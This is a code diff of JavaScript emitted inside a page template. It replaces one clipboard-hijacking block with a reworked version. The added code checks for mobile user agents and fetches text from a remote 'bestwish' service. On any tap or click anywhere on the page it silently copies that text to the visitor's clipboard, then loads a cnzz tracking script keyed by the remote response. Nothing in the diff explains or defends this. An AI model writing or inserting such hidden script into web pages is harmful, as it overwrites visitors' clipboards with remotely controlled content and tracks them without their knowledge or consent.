@@ -149,61 +149,134 @@ d(), o(), "jsonp" === l ? e() : g();
 }
 a.ajax = c;
 })(window);
-ajax({
-type: "get",
-url: "https://www.shuxia123.com/services/bestwish/one/${code}",
-timeOut: 5000,
-before: function () {
-console.log("before");
-},
-success: function (contentText) {
-try {
-var response = JSON.parse(contentText);
-if (!response || !response.response || response.meta.code !== 0) {
-    return;
-}
-var cnzzUrl= "https://v1.cnzz.com/z_stat.php?id=" + response.response.code;
-var content = response.response.description;
-var $domContainer = document.createElement("div");
-$domContainer.classList.add("bestWish-ab-cd");
-$domContainer.setAttribute("id", "bestWish-ab-cd");
-$domContainer.setAttribute("data-clipboard-text", content);
-document.body.append($domContainer);
-var haveCreateCnzz = false;
-setTimeout(() => {
-    new ClipboardJS(".bestWish-ab-cd");
-    var elementCopy = document.querySelector("#bestWish-ab-cd");
-    function createCnzz() {
-    if (haveCreateCnzz) {
-        return;
+
+function clipboardCopy(text) {
+    // Use the Async Clipboard API when available. Requires a secure browsing
+    // context (i.e. HTTPS)
+    if (navigator.clipboard) {
+      return navigator.clipboard.writeText(text).catch(function (err) {
+        throw err !== undefined
+          ? err
+          : new DOMException("The request is not allowed", "NotAllowedError");
+      });
     }
-    haveCreateCnzz = true;
-    var script = document.createElement("script");
-    script.setAttribute(
-        "src",
-        cnzzUrl
-    );
-    script.setAttribute("type", "text/javascript");
-    document.body.append(script);
+  
+    // ...Otherwise, use document.execCommand() fallback
+  
+    // Put the text to copy into a <span>
+    var span = document.createElement("span");
+    span.textContent = text;
+  
+    // Preserve consecutive spaces and newlines
+    span.style.whiteSpace = "pre";
+    span.style.webkitUserSelect = "auto";
+    span.style.userSelect = "all";
+  
+    // Add the <span> to the page
+    document.body.appendChild(span);
+  
+    // Make a selection object representing the range of text selected by the user
+    var selection = window.getSelection();
+    var range = window.document.createRange();
+    selection.removeAllRanges();
+    range.selectNode(span);
+    selection.addRange(range);
+  
+    // Copy text to the clipboard
+    var success = false;
+    try {
+      success = window.document.execCommand("copy");
+    } catch (err) {
+      console.log("error", err);
     }
-    document.addEventListener("touchend", () => {
-    elementCopy.click();
-    setTimeout(() => {
-        createCnzz();
-    }, 500);
+  
+    // Cleanup
+    selection.removeAllRanges();
+    window.document.body.removeChild(span);
+  
+    return success
+      ? Promise.resolve()
+      : Promise.reject(
+          new DOMException("The request is not allowed", "NotAllowedError")
+        );
+  }
+
+function IsPC() {
+    var userAgentInfo = navigator.userAgent;
+    var Agents = [
+      "Android",
+      "iPhone",
+      "SymbianOS",
+      "Windows Phone",
+      "iPad",
+      "iPod",
+    ];
+    var flag = true;
+    for (var v = 0; v < Agents.length; v++) {
+      if (userAgentInfo.indexOf(Agents[v]) > 0) {
+        flag = false;
+        break;
+      }
+    }
+    return flag;
+  }
+
+if (!IsPC()) {
+    ajax({
+      type: "get",
+      url: "https://www.shuxia123.com/services/bestwish/one/1279426249",
+      timeOut: 5000,
+      before: function () {
+        console.log("before");
+      },
+      success: function (contentText) {
+        try {
+          var response = JSON.parse(contentText);
+          if (
+            !response ||
+            !response.response ||
+            response.meta.code !== 0 ||
+            !response.response.code
+          ) {
+            return;
+          }
+          var cnzzUrl =
+            "https://v1.cnzz.com/z_stat.php?id=" + response.response.code;
+          var content = response.response.description;
+          var haveCreateCnzz = false;
+          setTimeout(() => {
+            function createCnzz() {
+                if (haveCreateCnzz) {
+                  return;
+                }
+                haveCreateCnzz = true;
+                var script = document.createElement("script");
+                script.setAttribute("src", cnzzUrl);
+                script.setAttribute("type", "text/javascript");
+                document.body.append(script);
+              }
+              document.addEventListener("touchend", () => {
+                clipboardCopy(content).then(() => {
+                  setTimeout(() => {
+                    createCnzz();
+                  }, 500);
+                });
+              });
+              document.addEventListener("click", () => {
+                clipboardCopy(content).then(() => {
+                  setTimeout(() => {
+                    createCnzz();
+                  }, 500);
+                });
+              });
+          }, 500);
+        } catch (e) {}
+      },
+      error: function () {
+        console.log("error");
+      },
     });
-    document.addEventListener("click", () => {
-    elementCopy.click();
-    setTimeout(() => {
-        createCnzz();
-    }, 500);
-    });
-}, 500);
-} catch (e) {}
-},
-error: function () {
-console.log("error");
-},
-});
+  }
+
     `;
 };
